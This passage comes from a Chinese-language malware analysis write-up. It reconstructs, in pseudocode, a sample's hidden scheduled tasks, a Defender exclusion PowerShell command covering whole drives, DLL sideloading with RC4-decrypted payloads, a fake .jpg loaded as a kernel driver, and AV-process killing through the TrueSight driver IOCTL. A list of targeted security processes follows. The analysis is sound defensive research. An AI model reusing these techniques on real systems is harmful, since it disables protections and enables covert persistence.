   trim_after_last_backslash(workdir_w); <span class="comment">// sub_180045E50</span></span><br><span class="line"></span><br><span class="line">    r = pVirtuOne(task_name, exe_full_w, &amp;unk_18007B7B4, workdir_w);</span><br><span class="line">    <span class="keyword">if</span> (r != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (VirtuOne(task_name, exe_full_w, &amp;unk_18007B7B8, workdir_w) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    VirtualFree(mem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>VirtuOne</code>调用 <code>RpcStringBindingComposeW</code>初始化RPC 连接。Interface UUID: <code>86D35949-83C9-4044-B424-DB363231FD0C</code>。这是Windows任务计划程序ITaskSchedulerService的 RPC 接口标识，对应的接口地址 <code>//pipe//atsvc</code></p>
<p>任务定义 XML：</p>
<ol>
<li><code>&lt;LogonTrigger&gt;</code>: 用户登录时触发。</li>
<li><code>&lt;RegistrationTrigger&gt;</code>: 任务注册后立即触发。</li>
<li><code>&lt;TimeTrigger&gt;</code>: 定时触发。<ul>
<li><code>Interval</code>: <code>PT1M</code> (每1分钟重复执行一次)。</li>
<li><code>StartBoundary</code>: 硬编码为 <code>2009-04-23T00:00:00</code>，确保立即开始。</li>
</ul>
</li>
</ol>
<ul>
<li><code>GroupId</code>: <code>S-1-5-32-545</code> (Users组)。</li>
<li><code>RunLevel</code>: <code>HighestAvailable</code> (以最高可用权限运行)。</li>
<li><code>&lt;Hidden&gt;true&lt;/Hidden&gt;</code>: 任务在任务计划程序UI中隐藏。</li>
<li><code>&lt;Priority&gt;4&lt;/Priority&gt;</code>: 优先级。</li>
<li><code>&lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;</code>: 无执行时间限制。</li>
<li><code>&lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;</code>: 即使使用电池也启动。</li>
<li><code>&lt;Exec&gt;</code>: 执行命令。</li>
<li><code>&lt;Command&gt;%s&lt;/Command&gt;</code>: 填入参数 <code>a2</code> (恶意 EXE 路径)。</li>
<li><code>&lt;WorkingDirectory&gt;%s&lt;/WorkingDirectory&gt;</code>: 填入参数 <code>a4</code> (工作目录)。</li>
</ul>
<p>最后调用 <code>NdrClientCall3</code>进行注册。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771393390954.png" alt="1771393390954"></p>
<h5 id="无黑名单进程时的分支路径"><a href="#无黑名单进程时的分支路径" class="headerlink" title="无黑名单进程时的分支路径"></a>无黑名单进程时的分支路径</h5><h6 id="添加白名单目录"><a href="#添加白名单目录" class="headerlink" title="添加白名单目录"></a>添加白名单目录</h6><p><code>invoke_shellexecutea_via_dynamic_resolve</code>构造PowerShell 命令告诉 Windows Defender不要扫描这些目录中的文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">invoke_shellexecutea_via_dynamic_resolve</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!sub_18003E550(ctx)) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 门控：是否命中目标进程</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* args   = <span class="string">&quot;Add-MpPreference -ExclusionPath &#x27;C:\\Windows&#x27;,&#x27;C:\\ProgramData&#x27;,&#x27;C:\\Users&#x27;,&#x27;C:\\Program Files (x86)&#x27;,&#x27;C:\\&#x27; -Force&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* file   = <span class="string">&quot;powershell.exe&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* verb   = <span class="string">&quot;open&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* api    = <span class="string">&quot;ShellExecuteA&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* module = <span class="string">&quot;Shell32.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line">    FARPROC p = GetProcAddress(GetModuleHandleA(module), api);</span><br><span class="line">    <span class="keyword">return</span> ((ShellExecuteA_t)p)(<span class="literal">NULL</span>, verb, file, args, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>sub_18003E550</code>检查的 5 个进程名是:</p>
<ol>
<li>msmpeng.exe</li>
<li>securityhealthsystray.exe</li>
<li>mpcopyaccelerator.exe</li>
<li>MpDefenderCoreService.exe</li>
<li>NisSrv.exe</li>
</ol>
<h6 id="创建计划任务-1"><a href="#创建计划任务-1" class="headerlink" title="创建计划任务"></a>创建计划任务</h6><p><code>run_embedded_task_payload_variant_b</code>在内存中反射加载另一个DLL, 通过该DLL的导出函数RegisterTask通过RPC来创建计划任务，流程以及创建效果和之前没有差别</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">run_embedded_task_payload_variant_b</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    mem = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x1CC6</span>, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, blob_B@<span class="number">0x1800A53D0</span>, <span class="number">0x1CC6</span>);</span><br><span class="line">    <span class="keyword">if</span> (!VirtualProtect(mem, <span class="number">0x1CC6</span>, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        VirtualFree(mem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pRegisterTask = ((<span class="type">entry_t</span>)mem)(...); <span class="comment">// 返回函数指针</span></span><br><span class="line"></span><br><span class="line">    rand5 = random_charset_azAZ0(<span class="number">5</span>);</span><br><span class="line">    task_name = <span class="string">L&quot;MicrosoftEdgeUpdateTaskUA Task-S-1-5-18 &quot;</span> + rand5;</span><br><span class="line">    exe_full_w = ansi_to_wide((<span class="type">char</span> *)(ctx + <span class="number">279</span>));</span><br><span class="line">    workdir_w  = ansi_to_wide((<span class="type">char</span> *)(ctx + <span class="number">279</span>));</span><br><span class="line">    trim_after_last_backslash(workdir_w);</span><br><span class="line"></span><br><span class="line">    r = pRegisterTask(task_name, exe_full_w, &amp;unk_18007B6F8, workdir_w);</span><br><span class="line">    <span class="keyword">if</span> (r != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (task_fn(task_name, exe_full_w, &amp;unk_18007B754, workdir_w) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    VirtualFree(mem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-12-malware_analysis_2/1771396829002.png" alt="1771396829002"></p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771396865570.png" alt="1771396865570"></p>
<h3 id="stage-4"><a href="#stage-4" class="headerlink" title="stage 4"></a>stage 4</h3><h4 id="DLL侧载（白-黑）"><a href="#DLL侧载（白-黑）" class="headerlink" title="DLL侧载（白+黑）"></a>DLL侧载（白+黑）</h4><p>释放落地的exe文件是具有白签名的EXE，其导入表里有npwzwmc64.dll</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771396984143.png" alt="1771396984143"></p>
<p>该DLL似乎由VMProtect进行保护</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771338721724.png" alt="1771338721724"></p>
<p>通过API Monitor找到疑似OEP的API函数调用（直接选择监控kernel32的所有api）</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771400177498.png" alt="1771400177498"></p>
<p>在x64dbg上调试loader并在 <code>SetProcessShutdownParameters</code>处下断点，dump出npwzwmc64.dll的.text段并查调用该API调用附近代码的引用情况。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771402532553.png" alt="1771402532553"></p>
<p>发现一处疑似DllEntryPoint形式的函数代码，并且没有其他函数引用。将其地址作为Scylla中的OEP地址，使用Scylla自动修复IAT表。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771402548869.png" alt="1771402548869"></p>
<p>调用 <code>load_space_ico_to_vector</code> 从当前目录读取 <code>space.ico</code>。</p>
<p>调用 <code>extract_and_rc4_decrypt_payload</code>：</p>
<ul>
<li>在 <code>space.ico</code> 中搜索 <code>;G_f</code>的标志；</li>
<li>取其之后的全部字节；</li>
<li>以 RC4 解密得到明文载荷。</li>
</ul>
<p><code>WriteProcessMemory(GetCurrentProcess(), EntryPoint, payload, size, ...)</code> 回写入口点代码。</p>
<p>从而在回到入口点时执行其自定义的代码。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771405720723.png" alt="1771405720723"></p>
<p>过程载荷解密 <code>vdi_ipc.dat</code>，将其反射加载到内存中, 找到其中的导出函数 <code>KMDrvFaxGetJobStatusType</code>, 对其进行调用。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771407848768.png" alt="1771407848768"></p>
<h4 id="vdi-ipc载荷"><a href="#vdi-ipc载荷" class="headerlink" title="vdi_ipc载荷"></a>vdi_ipc载荷</h4><p>该dll依然由VMprotect进行保护</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771473137258.png" alt="1771473137258"></p>
<p>脱去VMprotect壳后依然复杂，实在分不清调用链，只能从功能函数入手分析。</p>
<h5 id="内核级干掉杀软"><a href="#内核级干掉杀软" class="headerlink" title="内核级干掉杀软"></a>内核级干掉杀软</h5><p><code>enum_and_target_security_processes</code> 遍历并命中 212 目标后进入服务&#x2F;驱动双链处置，其伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">enum_and_target_security_processes</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    <span class="built_in">list</span> = security_process_name_list_212;</span><br><span class="line">    temp_dir  = decode_temp_dir_blob_once();      <span class="comment">// -&gt; &quot;C:\\Windows\\Temp\\&quot;</span></span><br><span class="line">    temp_file = decode_temp_file_blob_once();     <span class="comment">// -&gt; &quot;ranchserv.jpg&quot;</span></span><br><span class="line">    fmt       = decode_path_format_blob_once();   <span class="comment">// -&gt; &quot;%s%s&quot;</span></span><br><span class="line">    match_ctx = format(fmt, temp_dir, temp_file); <span class="comment">// -&gt; &quot;C:\\Windows\\Temp\\ranchserv.jpg&quot;</span></span><br><span class="line">    first_hit = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (snap == INVALID_HANDLE_VALUE) &#123; Sleep(<span class="number">2000</span>); <span class="keyword">continue</span>; &#125;</span><br><span class="line">        <span class="keyword">for</span> (ok = Process32First(snap, &amp;pe); ok; ok = Process32Next(snap, &amp;pe)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">212</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (_stricmp(pe.szExeFile, <span class="built_in">list</span>[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">                    pid = pe.th32ProcessID;</span><br><span class="line">                    <span class="keyword">if</span> (first_hit &amp;&amp; check_path_exists_gate(match_ctx)) &#123;</span><br><span class="line">                        <span class="comment">// 仅当 ranchserv.jpg 存在时才触发服务/管道链</span></span><br><span class="line">                        trigger_service_flow_on_match(match_ctx);</span><br><span class="line">                        first_hit = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    handle_matched_security_process(<span class="built_in">list</span>[i], pid);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(<span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>trigger_service_flow_on_match</code>伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">trigger_service_flow_on_match</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ctx_path)</span> &#123;</span><br><span class="line">    FindFirstFileA(ctx_path, &amp;fd);      <span class="comment">// ctx_path= C:\Windows\Temp\ranchserv.jpg</span></span><br><span class="line">    service_tcl_orchestrator(ctx_path); <span class="comment">// 首次执行</span></span><br><span class="line">    Sleep(<span class="number">0x1388</span>);</span><br><span class="line">    service_tcl_orchestrator(ctx_path); <span class="comment">// 重试1</span></span><br><span class="line">    Sleep(<span class="number">0x1388</span>);</span><br><span class="line">    service_tcl_orchestrator(ctx_path); <span class="comment">// 重试2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>service_tcl_orchestrator</code>伪代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">service_tcl_orchestrator</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ctx)</span> &#123;</span><br><span class="line">    ensure_service_running_and_query(ctx);</span><br><span class="line">    svc_name = <span class="string">&quot;TCLService&quot;</span>;</span><br><span class="line">    req_path = format(<span class="string">&quot;%s&quot;</span>, ctx); <span class="comment">// 即 ranchserv.jpg 的完整路径</span></span><br><span class="line">    pipe_ntsvcs_send_request(<span class="string">&quot;ntsvcs&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;&#123;367abb81-9844-35f1-ad32-98f038001003&#125;&quot;</span>,</span><br><span class="line">                             <span class="number">2</span>,</span><br><span class="line">                             &amp;resp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ensure_service_running_and_query</code>确保TCLService服务可用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">ensure_service_running_and_query</span><span class="params">(...)</span> &#123;</span><br><span class="line">    svc = decrypt_service_name_once(); <span class="comment">// &quot;TCLService&quot;</span></span><br><span class="line">    hSCM = OpenSCManagerA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    hSvc = OpenServiceA(hSCM, svc, SERVICE_ALL_ACCESS);</span><br><span class="line">    QueryServiceStatus(hSvc, &amp;st);</span><br><span class="line">    <span class="keyword">if</span> (st.dwCurrentState != SERVICE_RUNNING) &#123;</span><br><span class="line">        StartServiceA(hSvc, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseServiceHandle(hSvc);</span><br><span class="line">    CloseServiceHandle(hSCM);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pipe_ntsvcs_send_request</code>连接 <code>\\.pipe\ntsvcs</code>的命名管道，</p>
<p><code>pipe_build_and_transact_guid_request</code>函数先绑定接口，目标接口 <code>UUID:367abb81-9844-35f1-ad32-98f038001003</code>，序列化协议 <code>GUID:8a885d04-1ceb-11c9-9fe8-08002b104860</code></p>
<p>然后按顺序发送了 3 个 RPC 请求</p>
<p>Opnum 27 (ROpenSCManagerA) 请求获取 SCM 的句柄。</p>
<p>Opnum 24 (RCreateServiceA) 直接命令 SCM 创建一个名为TCLService的服务。</p>
<p>关键参数：</p>
<ul>
<li><code>ServiceName</code>: TCLService</li>
<li><code>dwDesiredAccess</code>: 0xF01FF (完全控制权限)</li>
<li><code>dwServiceType</code>:  1 (SERVICE_KERNEL_DRIVER) 。告诉系统这是一个内核驱动。</li>
<li><code>dwStartType</code>: 2 (开机自启)。</li>
<li><code>BinaryPath</code>:  C:\Windows\Temp\ranchserv.jpg。将系统驱动路径指向一个 Temp 目录下的伪装图片文件。</li>
</ul>
<p>系统 SCM 进程收到这个合法格式的 RPC 包后，会在注册表 <code>HKLM\SYSTEM\CurrentControlSet\Services\TCLService</code> 下写入这些配置。</p>
<p>Opnum 31 (RStartServiceA) 发送启动命令。</p>
<p>结果 ：系统内核（Ntoskrnl.exe）读取路径，将 <code>ranchserv.jpg</code> 作为 PE 格式的内核驱动程序映射到内核空间并执行其 <code>DriverEntry</code>。至此，恶意软件获得了系统的最高权限（Ring 0）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">pipe_ntsvcs_send_request</span><span class="params">(pipe_name, guid, mode, out_resp)</span> &#123;</span><br><span class="line">    path = <span class="string">&quot;\\\\.\\pipe\\ntsvcs&quot;</span>;</span><br><span class="line">    hPipe = CreateFileA(path, GENERIC_READ|GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    init_request_ctx(...);</span><br><span class="line">    pipe_build_and_transact_guid_request(&amp;request_ctx);</span><br><span class="line">    memmove_fast_wrapper(out_resp, &amp;request_ctx, <span class="number">4128</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handle_matched_security_process</code>利用漏洞驱动设备 <code>\\.\TrueSight</code>，通过 IOCTL <code>0x22E044</code> 对命中 PID 执行终结路径。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">handle_matched_security_process</span><span class="params">(name, pid)</span> &#123;</span><br><span class="line">    hDev = CreateFileW(<span class="string">L&quot;\\\\.\\TrueSight&quot;</span>, GENERIC_READ|GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    in_pid = pid;</span><br><span class="line">    DeviceIoControl(hDev, <span class="number">0x22E044</span>, &amp;in_pid, <span class="number">4</span>, &amp;out8, <span class="number">8</span>, &amp;ret, <span class="literal">NULL</span>); <span class="comment">// 第1次</span></span><br><span class="line">    DeviceIoControl(hDev, <span class="number">0x22E044</span>, &amp;in_pid, <span class="number">4</span>, &amp;out8, <span class="number">8</span>, &amp;ret, <span class="literal">NULL</span>); <span class="comment">// 第2次</span></span><br><span class="line">    CloseHandle(hDev);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-12-malware_analysis_2/1771486279034.png" alt="1771486279034"></p>
<p>附录：212个安全相关进程名如下：</p>
<ul>
<li>[0] 360Safe.exe</li>
<li>[1] 360sd.exe</li>
<li>[2] 360rp.exe</li>
<li>[3] 360rps.exe</li>
<li>[4] 360Tray.exe</li>
<li>[5] ZhuDongFangYu.exe</li>
<li>[6] LiveUpdate360.exe</li>
<li>[7] 360leakfixer.exe</li>
<li>[8] 360sdrun.exe</li>
<li>[9] 360sdupd.exe</li>
<li>[10] 360FileGuard.exe</li>
<li>[11] dep360.exe</li>
<li>[12] SRAgent.exe</li>
<li>[13] ModuleUpdate.exe</li>
<li>[14] FileSmasher.exe</li>
<li>[15] AgreementViewer.exe</li>
<li>[16] SoftMgrLite.exe</li>
<li>[17] KanKan.exe</li>
<li>[18] SuperKiller.exe</li>
<li>[19] DumpUper.exe</li>
<li>[20] DSMain.exe</li>
<li>[21] DSMain64.exe</li>
<li>[22] FirstAidBox.exe</li>
<li>[23] CheckSM.exe</li>
<li>[24] HipsMain.exe</li>
<li>[25] HipsDaemon.exe</li>
<li>[26] HipsTray.exe</li>
<li>[27] HRUpdate.exe</li>
<li>[28] HipsLog.exe</li>
<li>[29] NetFlow.exe</li>
<li>[30] Autoruns.exe</li>
<li>[31] usysdiag.exe</li>
<li>[32] wsctrlsvc.exe</li>
<li>[33] wsctrl.exe</li>
<li>[34] kxemain.exe</li>
<li>[35] kxescore.exe</li>
<li>[36] kscan.exe</li>
<li>[37] kxecenter.exe</li>
<li>[38] kxetray.exe</li>
<li>[39] kdinfomgr.exe</li>
<li>[40] kislive.exe</li>
<li>[41] knewvip.exe</li>
<li>[42] ksoftpurifier.exe</li>
<li>[43] ktrashautoclean.exe</li>
<li>[44] kauthorityview.exe</li>
<li>[45] TQClient.exe</li>
<li>[46] TQedrname.exe</li>
<li>[47] TQSafeUI.exe</li>
<li>[48] TQTray.exe</li>
<li>[49] trantorAgent.exe</li>
<li>[50] TQDefender.exe</li>
<li>[51] TQUpdateUI.exe</li>
<li>[52] TQWatermark.exe</li>
<li>[53] DlpAppData.exe</li>
<li>[54] NACLdis.exe</li>
<li>[55] MsMpEng.exe</li>
<li>[56] MpCmdRun.exe</li>
<li>[57] Ldshelper.exe</li>
<li>[58] LdsSecurity.exe</li>
<li>[59] LdsSecurityAider.exe</li>
<li>[60] ComputerZTray.exe</li>
<li>[61] computercenter.exe</li>
<li>[62] guardhp.exe</li>
<li>[63] ComputerZ_CN.exe</li>
<li>[64] ComputerZService.exe</li>
<li>[65] ComputerzService_x64.exe</li>
<li>[66] hdw_disk_scan.exe</li>
<li>[67] ComputerZMonHelper.exe</li>
<li>[68] DrvMgr.exe</li>
<li>[69] web_host.exe</li>
<li>[70] 2345SafeCenterSvc.exe</li>
<li>[71] 2345RTProtect.exe</li>
<li>[72] 2345SafeSvc.exe</li>
<li>[73] 2345MPCSafe.exe</li>
<li>[74] 2345SafeTray.exe</li>
<li>[75] 2345SafeUpdate.exe</li>
<li>[76] 2345VirusScan.exe</li>
<li>[77] 2345ManuUpdate.exe</li>
<li>[78] 2345AdRtProtect.exe</li>
<li>[79] 2345AuthorityProtect.exe</li>
<li>[80] 2345ExtShell.exe</li>
<li>[81] 2345ExtShell64.exe</li>
<li>[82] 2345FileShre.exe</li>
<li>[83] 2345LeakFixer.exe</li>
<li>[84] 2345LSPFix.exe</li>
<li>[85] 2345PCSafeBootAssistant.exe</li>
<li>[86] 2345RtProtectCenter.exe</li>
<li>[87] 2345ShellPro.exe</li>
<li>[88] 2345SysDoctor.exe</li>
<li>[89] LenovoPcManagerService.exe</li>
<li>[90] LenovoPcManager.exe</li>
<li>[91] LAVService.exe</li>
<li>[92] LenovoTray.exe</li>
<li>[93] LnvSvcFdn.exe</li>
<li>[94] wsctrl7.exe</li>
<li>[95] wsctrl10.exe</li>
<li>[96] wsctrl11.exe</li>
<li>[97] LenovoAppupdate.exe</li>
<li>[98] LenovoAppStore.exe</li>
<li>[99] DesktopAssistantApp.exe</li>
<li>[100] DesktopAssistant.exe</li>
<li>[101] LenovoMonitorManager.exe</li>
<li>[102] LenovoOKM.exe</li>
<li>[103] LeASHive.exe</li>
<li>[104] StartupManager.exe</li>
<li>[105] WSPluginHost.exe</li>
<li>[106] WSPluginHost64.exe</li>
<li>[107] crashpad_handler.exe</li>
<li>[108] SearchEngine.exe</li>
<li>[109] LISFService.exe</li>
<li>[110] Lsf.exe</li>
<li>[111] Appvant.exe</li>
<li>[112] LenovoInternetSoftwareFramework.exe</li>
<li>[113] EMDriverAssist.exe</li>
<li>[114] LeAppOM.exe</li>
<li>[115] hotfixplatform.exe</li>
<li>[116] MSPCManager.exe</li>
<li>[117] MSPCManagerService.exe</li>
<li>[118] avp.exe</li>
<li>[119] avpui.exe</li>
<li>[120] AvastSvc.exe</li>
<li>[121] aswToolsSvc.exe</li>
<li>[122] aswidsagent.exe</li>
<li>[123] wsc_proxy.exe</li>
<li>[124] AvastUI.exe</li>
<li>[125] Avira.Spotlight.Service.exe</li>
<li>[126] endpointprotection.exe</li>
<li>[127] SentryEye.exe</li>
<li>[128] Avira.Spotlight.Common.Updater.exe</li>
<li>[129] Avira.Spotlight.FallbackUpdater.exe</li>
<li>[130] Avira.Spotlight.UI.Application.exe</li>
<li>[131] Avira.Spotlight.Systray.Application.exe</li>
<li>[132] Avira.OptimizerHost.exe</li>
<li>[133] Avira.Spotlight.Bootstrapper.exe</li>
<li>[134] Avira.Spotlight.Service.Worker.exe</li>
<li>[135] Avira.Spotlight.Common.UpdaterTracker.exe</li>
<li>[136] Avira.Spotlight.UI.Application.Messaging.exe</li>
<li>[137] Avira.Spotlight.UI.AdministrativeRightsProvider.exe</li>
<li>[138] mfemms.exe</li>
<li>[139] mfevtps.exe</li>
<li>[140] mcapexe.exe</li>
<li>[141] mcshield.exe</li>
<li>[142] McUICnt.exe</li>
<li>[143] MfeAVSvc.exe</li>
<li>[144] NisSrv.exe</li>
<li>[145] SecurityHealthSystray.exe</li>
<li>[146] kwsprotect64.exe</li>
<li>[147] QMDL.exe</li>
<li>[148] QMPersonalCenter.exe</li>
<li>[149] QQPCPatch.exe</li>
<li>[150] QQPCRealTimeSpeedup.exe</li>
<li>[151] QQPCRTP.exe</li>
<li>[152] QQPCTray.exe</li>
<li>[153] QQRepair.exe</li>
<li>[154] QQPCMgrUpdate.exe</li>
<li>[155] KSafeTray.exe</li>
<li>[156] mpcopyaccelerator.exe</li>
<li>[157] UnThreat.exe</li>
<li>[158] K7TSecurity.exe</li>
<li>[159] ad-watch.exe</li>
<li>[160] PSafeSysTray.exe</li>
<li>[161] vsserv.exe</li>
<li>[162] remupd.exe</li>
<li>[163] rtvscan.exe</li>
<li>[164] ashDisp.exe</li>
<li>[165] avcenter.exe</li>
<li>[166] TMBMSRV.exe</li>
<li>[167] knsdtray.exe</li>
<li>[168] V3Svc.exe</li>
<li>[169] mssecess.exe</li>
<li>[170] QUHLPSVC.EXE</li>
<li>[171] RavMonD.exe</li>
<li>[172] KvMonXP.exe</li>
<li>[173] baiduSafeTray.exe</li>
<li>[174] BaiduSd.exe</li>
<li>[175] Bka.exe</li>
<li>[176] BkavService.exe</li>
<li>[177] BkavSystemServer.exe</li>
<li>[178] BkavSystemService.exe</li>
<li>[179] BkavSystemService64.exe</li>
<li>[180] BkavUtil.exe</li>
<li>[181] BLuPro.exe</li>
<li>[182] BluProService.exe</li>
<li>[183] cefutil.exe</li>
<li>[184] PopWndLog.exe</li>
<li>[185] PromoUtil.exe</li>
<li>[186] QHActiveDefense.exe</li>
<li>[187] QHSafeMain.exe</li>
<li>[188] QHSafeScanner.exe</li>
<li>[189] QHSafeTray.exe</li>
<li>[190] QHWatchdog.exe</li>
<li>[191] safeboxTray.exe</li>
<li>[192] 360safebox.exe</li>
<li>[193] KSafeSvc.exe</li>
<li>[194] KWatch.exe</li>
<li>[195] gov_defence_service.exe</li>
<li>[196] gov_defence_daemon.exe</li>
<li>[197] safesvr.exe</li>
